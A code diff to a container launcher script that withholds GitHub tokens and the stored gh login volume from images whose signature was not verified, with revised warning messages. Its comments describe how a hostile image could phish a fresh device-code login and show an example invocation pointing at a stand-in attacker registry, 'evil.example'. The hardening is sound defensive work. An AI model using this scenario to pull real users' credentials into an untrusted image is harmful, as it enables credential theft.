@@ -59,9 +59,16 @@
 #       Used instead of GH_TOKEN when the host has no working `gh` login.
 #       This is a podman-managed named volume, not a bind mount, so an
 #       in-container `gh auth login` (device-code flow) persists across runs
-#       without ever touching the host's own ~/.config/gh. It is a stored
-#       credential all the same, which is why it is withheld on the same
-#       terms as the token rather than being treated as the safe fallback.
+#       without ever touching the host's own ~/.config/gh.
+#
+#       It is withheld on the same terms as the token, and not merely because
+#       of what it might already hold. Read it the other way round: an
+#       unverified image handed an empty volume runs the device-code login
+#       itself, and README.md tells first-time users that "the tool walks you
+#       through `gh auth login` on first run" -- so they will complete it and
+#       believe it is setup. The branch that looks like the safe fallback is
+#       the more effective attack. It does not read a stale credential; it
+#       gets the user to mint a fresh one on request.
 #
 #       Both are gated on the signature check above having actually run and
 #       passed. See the GitHub auth section below for why, and for the
@@ -113,12 +120,18 @@ fi
 # Verify only what this project publishes. A user running their own build must
 # not be pushed through this repository's certificate identity, which their
 # image cannot satisfy.
-verify_image=no
+# Two different questions, and the auth block below needs both. Whether this
+# is an image this project publishes never changes; whether it was verified
+# does, because AIB_SKIP_VERIFY turns the second to no while leaving the
+# first yes. Keeping them apart is what lets an unverified run name its
+# actual cause instead of printing one message for two unrelated situations.
+publishes_this_image=no
 case "$AIB_IMAGE" in
     "$AIB_PUBLISHED_REPO" | "$AIB_PUBLISHED_REPO":* | "$AIB_PUBLISHED_REPO"@*)
-        verify_image=yes
+        publishes_this_image=yes
         ;;
 esac
+verify_image="$publishes_this_image"
 
 if [ -n "${AIB_SKIP_VERIFY:-}" ] && [ "$verify_image" = yes ]; then
     echo "aib: WARNING - AIB_SKIP_VERIFY is set. Running $AIB_IMAGE without" >&2
@@ -188,9 +201,9 @@ fi
 # --- GitHub auth -------------------------------------------------------
 # Credentials follow verification, not the run. Both branches below hand the
 # container a GitHub credential -- a token minted from the host's `gh` login,
-# or the volume holding whatever an earlier in-container `gh auth login`
-# stored -- and an image whose signature nothing checked has not earned
-# either. Forwarding them regardless would make
+# or the volume an in-container `gh auth login` writes to, which an image can
+# be handed empty and fill itself -- and an image whose signature nothing
+# checked has not earned either. Forwarding them regardless would make
 #
 #     AIB_IMAGE=evil.example/evil/image aib
 #
@@ -210,9 +223,35 @@ if [ "$forward_auth" = no ]; then
     # Not fatal: an unverified image is still worth running for the parts of
     # the tool that touch no remote -- reviewing a scan, generating files to
     # inspect. It is the credential that is withheld, not the run.
-    echo "aib: not passing GitHub credentials to an unverified image. The tool" >&2
-    echo "aib: will start, but every step that reaches GitHub will be logged out." >&2
-    echo "aib: Set AIB_ALLOW_UNVERIFIED_AUTH=1 to forward them anyway." >&2
+    #
+    # Two messages, because there are two ways to get here and they call for
+    # different responses. A custom AIB_IMAGE, on this project's stated
+    # audience -- "beginner and intermediate atomic-desktop users", per
+    # README.md -- is nearly always a typo or something a stranger said to
+    # paste, so it says how to undo it first and names the override last: a
+    # reader who has to go searching for why the tool is logged out would
+    # otherwise meet the workaround before the fix. AIB_SKIP_VERIFY is a
+    # deliberate choice whose remedy the warning above already gives, so that
+    # branch only adds what is new.
+    #
+    # Kept short on purpose. These lines are the only security UI an audience
+    # that does not read docs ever sees, and a six-line block at the moment
+    # someone is already confused gets skimmed rather than read. Nobody on the
+    # ordinary path sees either message: a verified image forwards the login
+    # exactly as before, with nothing printed.
+    if [ "$publishes_this_image" = yes ]; then
+        # Two lines, because the AIB_SKIP_VERIFY warning printed further up has
+        # already named the cause and how to undo it. Repeating "unset
+        # AIB_SKIP_VERIFY" here would say it twice in one screen, which reads
+        # as two separate problems.
+        echo "aib: An unverified image also gets no GitHub login, so the steps that" >&2
+        echo "aib: reach GitHub will fail. AIB_ALLOW_UNVERIFIED_AUTH=1 sends it anyway." >&2
+    else
+        echo "aib: $AIB_IMAGE is not published by this project, so its signature" >&2
+        echo "aib: was not checked -- and an unverified image gets no GitHub login." >&2
+        echo "aib: Not what you wanted? Unset AIB_IMAGE." >&2
+        echo "aib: Your own build? Set AIB_ALLOW_UNVERIFIED_AUTH=1." >&2
+    fi
 elif command -v gh >/dev/null 2>&1 && gh auth status >/dev/null 2>&1; then
     GH_TOKEN="$(gh auth token)"
     export GH_TOKEN
